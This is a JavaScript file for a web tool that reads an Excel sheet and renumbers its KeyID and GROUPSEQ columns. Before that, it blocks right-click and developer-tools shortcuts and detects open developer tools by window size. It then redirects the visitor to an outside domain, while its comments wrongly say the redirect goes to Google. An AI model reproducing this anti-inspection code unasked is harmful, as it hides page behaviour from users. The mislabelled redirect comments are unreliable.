// Mencegah klik kanan
document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
    alert("Right-click is disabled!");
});

// Mencegah semua shortcut untuk Developer Tools
document.addEventListener('keydown', function(event) {
    // F12
    if (event.keyCode === 123) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + I (Windows/Linux) - Developer Tools
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 73) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + I (Mac) - Developer Tools
    else if (event.metaKey && event.keyCode === 73 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + J (Windows/Linux) - Developer Tools Console
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 74) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + J (Mac) - Developer Tools Console
    else if (event.metaKey && event.keyCode === 74 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + C (Windows/Linux) - Inspect Element
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 67) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + C (Mac) - Inspect Element
    else if (event.metaKey && event.keyCode === 67 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + U (Windows/Linux) - View Source
    else if ((event.ctrlKey || event.metaKey) && event.keyCode === 85) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + U (Mac) - View Source
    else if (event.metaKey && event.keyCode === 85 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + F (Windows/Linux) - Open "Find" bar
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 70) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + F (Mac) - Open "Find" bar
    else if (event.metaKey && event.keyCode === 70 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + D (Windows/Linux) - Developer Tools Dock
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 68) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + D (Mac) - Developer Tools Dock
    else if (event.metaKey && event.keyCode === 68 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // F1 (Help) - Biasanya digunakan untuk membuka Help, seringkali membuka Developer Tools
    else if (event.keyCode === 112) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + E (Windows/Linux) - Network Tab in Developer Tools
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 69) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + E (Mac) - Network Tab in Developer Tools
    else if (event.metaKey && event.keyCode === 69 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + M (Windows/Linux) - Device Mode Toggle
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 77) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + M (Mac) - Device Mode Toggle
    else if (event.metaKey && event.keyCode === 77 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
});

// Menangani deteksi Developer Tools dengan perubahan ukuran jendela
let devToolsOpen = false;

function checkWindowSize() {
    // Tentukan ambang batas perbedaan ukuran untuk mendeteksi Developer Tools
    const threshold = 160;
    const windowWidthDifference = window.outerWidth - window.innerWidth;
    const windowHeightDifference = window.outerHeight - window.innerHeight;

    // Jika perbedaan ukuran lebih besar dari threshold, itu mungkin berarti Developer Tools terbuka
    if (windowWidthDifference > threshold || windowHeightDifference > threshold) {
        if (!devToolsOpen) {
            devToolsOpen = true;
            window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke halaman lain
        }
    } else {
        devToolsOpen = false;
    }
}

// Mengecek perubahan ukuran jendela setiap 500ms
setInterval(checkWindowSize, 500);




document.getElementById('process-btn').addEventListener('click', function () {
    const fileInput = document.getElementById('file-input');
    const file = fileInput.files[0];
    
    if (!file) {
        alert("Silakan pilih file Excel terlebih dahulu!");
        return;
    }

    const reader = new FileReader();
    reader.onload = function (e) {
        const data = new Uint8Array(e.target.result);
        const workbook = XLSX.read(data, { type: 'array' });
        const firstSheetName = workbook.SheetNames[0];
        const worksheet = workbook.Sheets[firstSheetName];

        // Konversi sheet ke dalam format JSON
        const jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1 });
        
        // Proses data sesuai dengan kriteria
        const processedData = processExcelData(jsonData);

        // Konversi kembali ke Excel dan siapkan untuk diunduh
        const newWorkbook = XLSX.utils.book_new();
        const newWorksheet = XLSX.utils.aoa_to_sheet(processedData); // Menggunakan array of arrays untuk mempertahankan urutan
        XLSX.utils.book_append_sheet(newWorkbook, newWorksheet, 'Sheet1');

        // Simpan sebagai file baru
        XLSX.writeFile(newWorkbook, 'Data Grup Sales Excel Final.xlsx');
    };

    reader.readAsArrayBuffer(file);
});

function processExcelData(data) {
    let sequentialNumber = 1; // untuk melacak nomor urut
    let inSequentialMode = false; // apakah sedang dalam mode sekuensial

    // Pastikan header tetap di tempat pertama
    const header = data[0];
    const processedData = [header]; // Simpan header

    for (let i = 1; i < data.length; i++) {
        const row = data[i];

        // Proses untuk kolom KeyID
        if (row[0] === 1) { // Kolom KeyID adalah yang pertama
            inSequentialMode = true;
            sequentialNumber = 2; // mulai dari 2 setelah menemukan 1
        } else if (inSequentialMode) {
            row[0] = sequentialNumber++; // Ubah nilai KeyID
            if (row[0] === 1) {
                inSequentialMode = false; // berhenti jika menemukan 1 lagi
            }
        }

        // Proses untuk kolom GROUPSEQ
        if (row[4] && row[4] !== '' && row[4] !== undefined) { // Cek jika GROUPSEQ terisi
            let j = i - 1; // mulai dari baris di atas
            while (j >= 0 && data[j][3].startsWith("--")) { // Cek ITEMOVDESC
                j--; // Naik ke baris di atas
            }
            // Jika ditemukan baris yang tidak diawali "--"
            if (j >= 0) {
                row[4] = data[j][0]; // Set GROUPSEQ sesuai dengan KeyID baris atas
            }
        }

        processedData.push(row); // Tambahkan baris yang telah diproses
    }

    return processedData; // Kembalikan data yang telah diproses
}
